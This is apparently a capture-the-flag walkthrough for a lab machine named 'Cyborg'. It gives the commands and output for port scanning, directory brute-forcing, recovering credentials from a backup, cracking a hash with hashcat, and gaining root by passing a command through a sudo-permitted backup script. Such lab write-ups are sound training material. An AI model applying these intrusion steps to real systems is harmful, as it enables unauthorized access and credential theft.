**InglÃªs:**

1. Begin by conducting an initial Nmap scan to identify open ports and services:
   ```
   nmap -sCV --open -oN nmap cyborg.thm
   ```

   Output:
   ```
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
   80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
   |_http-server-header: Apache/2.4.18 (Ubuntu)
   |_http-title: Apache2 Ubuntu Default Page: It works
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
   ```

2. Utilize GoBuster to search for directories on the web server:
   ```
   gobuster dir -u http://cyborg.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 90
   ```

   Explanation:
   - `dir`: Specifies directory mode.
   - `-u`: Specifies the URL.
   - `-w`: Specifies the path to the wordlist.
   - `-t`: Sets the number of threads for concurrent requests. Threads are often used to manage client requests and execute code to process these requests.

   Output:
   ```
   [--> http://cyborg.thm/admin/]
   [--> http://cyborg.thm/etc/]
   ```

3. Explore the `/admin/` directory and locate an "arquive.tar" for extraction.
   - It is a Borg Backup repository. Refer to [https://borgbackup.readthedocs.io/](https://borgbackup.readthedocs.io/).

4. Examine the contents of `music_archive` and find a note containing a username and password:
   ```
   cat home/alex/Documents/note.txt
   ```

   Output:
   ```
   Wow, I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
   " user:passwd "
   ```

5. Investigate the `/etc/` directory and discover a file named `passwd`.
   - Search for encrypted passwords within the file.

6. Analyze the hash in `passwd` using hashid to identify the hash type:
   ```
   hashid "hash"
   ```

7. If the hash is recognized as type 1600, employ hashcat to attempt to crack it:
   ```
   hashcat -a 0 -m 1600 "hash" "path/to/word/list"
   ```

8. Within the machine, verify the user's sudo permissions:
   ```
   sudo -l
   ```

   Output:
   ```
   (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
   ```

9. Identify that the user possesses the privilege to execute a `.sh` file with root permissions without a password.
   - Scrutinize the `backup.sh` script which mandates an argument to finalize program execution.

10. Exploit the `backup.sh` script to attain root access.

11. To escalate to root, let's inspect the code. It appears to be awaiting an argument where there is a "WHILE" loop. Therefore, you can use the following command to execute a command and obtain the root flag:
    ```
    sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
    ```

12. This command will retrieve the root flag.
